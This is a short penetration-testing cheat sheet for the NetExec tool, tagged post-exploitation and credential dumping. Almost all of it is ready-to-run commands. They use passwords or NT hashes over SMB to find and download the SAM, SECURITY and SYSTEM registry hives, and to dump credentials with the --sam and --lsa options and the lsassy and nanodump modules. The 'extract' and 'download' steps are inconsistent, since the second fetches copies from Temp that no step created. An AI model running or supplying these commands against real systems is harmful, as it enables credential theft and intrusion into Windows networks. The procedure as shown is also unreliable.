---
author(s):
  - Userware
tags:
  - post-exploitation
  - os-credential-dumping
  - network-ports
  - msrpc
  - smb
  - staying-off-the-land
  - windows
---
# NetExec

## 01 - Manual Hashdump

### 1.1 - Search hive files

```
$ netexec smb <IP> -u <username> -H <nt_hash> [-d <domain> | --local-auth] --spider "C$" --spider-folder /Windows/System32/config/ --regex "(SAM|SECURITY|SYSTEM)"
```

### 1.2 - Extract hive files

#### 1.2.1 - SMB Port

```
$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/System32/config/SAM SAM

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/System32/config/SECURITY SECURITY

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/System32/config/SYSTEM SYSTEM
```

### 1.3 - Download hive files

```
$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/Temp/SAM SAM

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/Temp/SECURITY SECURITY

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/Temp/SYSTEM SYSTEM
```

## 02 - Automated Hashdump

```
$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --sam

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --lsa

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] -M lsassy

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] -M nanodump
```